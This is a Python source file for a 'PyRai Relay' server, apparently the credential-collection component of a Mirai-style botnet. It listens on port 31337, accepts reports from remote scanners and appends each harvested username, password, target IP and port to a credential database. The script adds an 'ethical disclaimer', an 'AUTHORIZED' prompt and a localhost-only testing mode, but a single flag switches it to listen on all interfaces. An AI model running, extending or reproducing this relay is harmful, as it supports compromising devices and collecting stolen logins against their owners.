#!/usr/bin/env python3
"""
PyRai Relay Module - Updated for Secure Testing
ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.
"""

import socket
import os
import logging
from datetime import datetime
from threading import Thread, Lock
from socketserver import ThreadingMixIn 
from colorama import Fore, Back, Style, init

# modules
from libs import truecolors

# Initialize colorama
init()

# Configuration
relay_ps = "||"
__MAXCONN__ = 100  # Reduced for testing
__PORT__ = 31337
__TESTING_MODE__ = True

# Thread-safe file operations
file_lock = Lock()
connection_count = 0
connection_lock = Lock()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('relay.log'),
        logging.StreamHandler()
    ]
)

def mkdir(path):
    """Create directory if it doesn't exist"""
    if not os.path.exists(path):
        os.makedirs(path)
        logging.info(f"Created directory: {path}")

def validate_credentials(data_parts):
    """Validate credential data format"""
    if len(data_parts) != 5:
        return False, "Invalid data format"
    
    # Basic validation
    username = data_parts[1].strip()
    password = data_parts[2].strip()
    ip = data_parts[3].strip()
    port = data_parts[4].strip()
    
    if not username or not ip:
        return False, "Missing required fields"
    
    # Validate IP format (basic)
    try:
        parts = ip.split('.')
        if len(parts) != 4:
            return False, "Invalid IP format"
        for part in parts:
            if not 0 <= int(part) <= 255:
                return False, "Invalid IP range"
    except:
        return False, "Invalid IP format"
    
    # Validate port
    try:
        port_num = int(port)
        if not 1 <= port_num <= 65535:
            return False, "Invalid port range"
    except:
        return False, "Invalid port format"
    
    return True, "Valid"

def is_duplicate_entry(ip, db_file):
    """Check if IP already exists in database"""
    try:
        if os.path.isfile(db_file):
            with open(db_file, 'r') as f:
                for line in f:
                    if line.strip() and ip in line:
                        return True
    except Exception as e:
        logging.error(f"Error checking duplicates: {str(e)}")
    return False

class ClientThread(Thread): 
    def __init__(self, ip, port, conn): 
        Thread.__init__(self) 
        self.ip = ip 
        self.port = port 
        self.conn = conn
        self.daemon = True  # Daemon thread for clean shutdown
 
    def run(self): 
        global relay_ps, connection_count, connection_lock, file_lock
        
        # Track connection count
        with connection_lock:
            global connection_count
            connection_count += 1
            current_connections = connection_count
        
        try:
            # Set socket timeout
            self.conn.settimeout(30)
            
            data = self.conn.recv(2048) 
            data = str(data, 'utf-8', 'ignore')
            
            if not data:
                truecolors.print_errn(f"Empty data from {self.ip}:{self.port}")
                return
            
            data_parts = data.split(relay_ps)
            
            if data_parts[0] == "!":
                truecolors.print_info(f"Received connection -> {self.ip}:{self.port}") 
                truecolors.print_info(f"Remote scanner ({self.ip}:{self.port}) is sending data..")
                
                # Validate data format
                is_valid, validation_msg = validate_credentials(data_parts)
                if not is_valid:
                    truecolors.print_errn(f"Invalid data from {self.ip}:{self.port}: {validation_msg}")
                    self.conn.send("400".encode('ascii'))  # Bad request
                    return
                
                username = data_parts[1]
                password = data_parts[2]
                target_ip = data_parts[3]
                target_port = data_parts[4]
                
                # Database file path
                db_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), "dump", "csdb.txt")
                
                # Thread-safe file operations
                with file_lock:
                    try:
                        # Check for duplicates
                        if is_duplicate_entry(target_ip, db_file):
                            truecolors.print_warn(f"IP: {target_ip} already in database, skipping...")
                            self.conn.send("409".encode('ascii'))  # Conflict
                            return
                        
                        # Write new credentials
                        with open(db_file, "a") as f:
                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            entry = f"{username}:{password}:{target_ip}:{target_port}:{timestamp}\n"
                            f.write(entry)
                            
                        truecolors.print_succ(f"Remote scanner ({self.ip}:{self.port}) stored new credentials!")
                        truecolors.print_succ(f"Target: {target_ip}:{target_port} | Creds: {username}:{password}")
                        
                        # Log to file
                        logging.info(f"New credentials stored: {target_ip}:{target_port} from scanner {self.ip}:{self.port}")
                        
                        self.conn.send("10".encode('ascii'))  # Success
                        
                    except Exception as e:
                        truecolors.print_errn(f"Database error: {str(e)}")
                        logging.error(f"Database error from {self.ip}:{self.port}: {str(e)}")
                        self.conn.send("500".encode('ascii'))  # Internal error
                        
            elif data.strip() == "#":
                truecolors.print_info(f"Received ping from scanner ({self.ip}:{self.port})")
                self.conn.send("200".encode('ascii'))  # OK
                
            else:
                truecolors.print_warn(f"Unknown command from {self.ip}:{self.port}: {data[:50]}")
                self.conn.send("404".encode('ascii'))  # Not found
                
        except socket.timeout:
            truecolors.print_warn(f"Connection timeout from {self.ip}:{self.port}")
        except Exception as e:
            truecolors.print_errn(f"Client thread error from {self.ip}:{self.port}: {str(e)}")
            logging.error(f"Client thread error: {str(e)}")
        finally:
            try:
                self.conn.close()
            except:
                pass
            
            # Decrement connection count
            with connection_lock:
                connection_count -= 1

def print_banner():
    """Print startup banner"""
    print("="*60)
    print("PyRai Relay Server - Updated for Secure Testing")
    print("ETHICAL DISCLAIMER: This tool is for authorized testing only.")
    print("="*60)

def print_stats():
    """Print current statistics"""
    db_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), "dump", "csdb.txt")
    credential_count = 0
    
    try:
        if os.path.isfile(db_file):
            with open(db_file, 'r') as f:
                credential_count = sum(1 for line in f if line.strip())
    except:
        pass
    
    truecolors.print_info(f"Active connections: {connection_count}")
    truecolors.print_info(f"Total credentials stored: {credential_count}")

def main():
    """Main relay function"""
    print_banner()
    
    if __TESTING_MODE__:
        truecolors.print_warn("TESTING MODE ENABLED")
        truecolors.print_warn(f"Max connections limited to: {__MAXCONN__}")
    
    # Safety confirmation
    print("\n[SAFETY CONFIRMATION]")
    print("This relay will collect credentials from remote scanners.")
    print("Ensure you have proper authorization for this testing activity.")
    confirm = input("Type 'AUTHORIZED' to continue: ")
    
    if confirm != 'AUTHORIZED':
        truecolors.print_errn("Safety confirmation failed. Exiting.")
        return
    
    # Create dump directory
    dump_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), "dump")
    mkdir(dump_dir)
    
    # Initialize database file
    db_file = os.path.join(dump_dir, "csdb.txt")
    if not os.path.exists(db_file):
        with open(db_file, 'w') as f:
            f.write(f"# PyRai Credential Database - Started {datetime.now()}\n")
            f.write("# Format: username:password:ip:port:timestamp\n")
    
    # Server setup
    TCP_IP = '127.0.0.1' if __TESTING_MODE__ else '0.0.0.0'  # Localhost only in testing
    TCP_PORT = int(__PORT__)
    
    truecolors.print_info(f"Starting relay on {TCP_IP}:{__PORT__}")
    truecolors.print_warn(f"Configuration set to allow {__MAXCONN__} connections..")
    
    try:
        tcpServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        tcpServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        tcpServer.bind((TCP_IP, TCP_PORT)) 
        tcpServer.listen(__MAXCONN__)
        
        threads = [] 
        truecolors.print_succ("Relay is online!")
        
        # Stats timer
        last_stats = datetime.now()
        
        while True: 
            try:
                # Print stats every 60 seconds
                if (datetime.now() - last_stats).seconds >= 60:
                    print_stats()
                    last_stats = datetime.now()
                
                # Accept connections with timeout
                tcpServer.settimeout(1)
                try:
                    (conn, (ip, port)) = tcpServer.accept()
                    
                    # Check connection limit
                    with connection_lock:
                        if connection_count >= __MAXCONN__:
                            truecolors.print_warn(f"Connection limit reached, rejecting {ip}:{port}")
                            conn.close()
                            continue
                    
                    newthread = ClientThread(ip, port, conn) 
                    newthread.start() 
                    threads.append(newthread)
                    
                    # Clean up finished threads
                    threads = [t for t in threads if t.is_alive()]
                    
                except socket.timeout:
                    continue  # Normal timeout, continue loop
                    
            except KeyboardInterrupt:
                truecolors.print_info("Shutdown signal received...")
                break
            except Exception as e:
                truecolors.print_errn(f"Server error: {str(e)}")
                logging.error(f"Server error: {str(e)}")
                break
        
        # Cleanup
        truecolors.print_info("Shutting down relay...")
        tcpServer.close()
        
        # Wait for threads to finish (with timeout)
        for t in threads:
            if t.is_alive():
                t.join(timeout=5)
        
        truecolors.print_succ("Relay shutdown complete.")
        
    except Exception as e:
        truecolors.print_errn(f"Fatal error: {str(e)}")
        logging.error(f"Fatal error: {str(e)}")

if __name__ == "__main__":
    main() 